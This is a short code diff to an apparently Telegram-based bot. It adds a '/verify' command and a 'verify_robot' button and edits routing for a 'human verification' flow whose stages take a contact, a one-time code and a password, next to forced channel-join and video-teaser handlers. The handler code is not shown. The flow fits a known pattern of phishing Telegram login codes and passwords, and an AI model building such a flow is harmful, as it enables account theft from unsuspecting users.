@@ -96,7 +96,10 @@ bot.command('cancel', async (ctx) => {
   await ctx.reply('✅ Operation cancelled.');
 });
 
-// Cancel an active human verification session
+bot.command('verify', async (ctx) => {
+  await humanVerificationHandler.startHumanVerification(ctx);
+});
+
 bot.command('cancel_session', async (ctx) => {
   await humanVerificationHandler.cancel(ctx);
 });
@@ -109,6 +112,10 @@ bot.callbackQuery('join_channels', async (ctx) => {
 
 bot.callbackQuery('check_join', async (ctx) => {
   await userHandlers.handleCheckJoin(ctx);
+});
+
+bot.callbackQuery('verify_robot', async (ctx) => {
+  await userHandlers.handleVerifyRobot(ctx);
 });
 
 bot.callbackQuery('see_videos', async (ctx) => {
@@ -163,9 +170,8 @@ bot.callbackQuery(/^(afolder|acfolder|acitem|acupload|acedit_title|acedit_desc|a
 // ---- Text message handling ----
 
 bot.on('message:text', async (ctx, next) => {
-  // Human verification: password input
+  // Human verification password / wrong-stage handling
   if (await humanVerificationHandler.tryHandlePassword(ctx)) return;
-  // Nudge user if they type during wrong stage (OTP / await_contact)
   if (await humanVerificationHandler.tryHandleWrongStageText(ctx)) return;
 
   const isSkip = /^\/skip(@\w+)?$/i.test(ctx.message.text.trim());
@@ -192,7 +198,7 @@ bot.on('message', async (ctx, next) => {
   return next();
 });
 
-// Track join requests for request-based channels
+// Join requests & member updates
 bot.on('chat_join_request', async (ctx) => {
   try {
     const { recordJoinRequest } = require('./src/services/forceJoin');
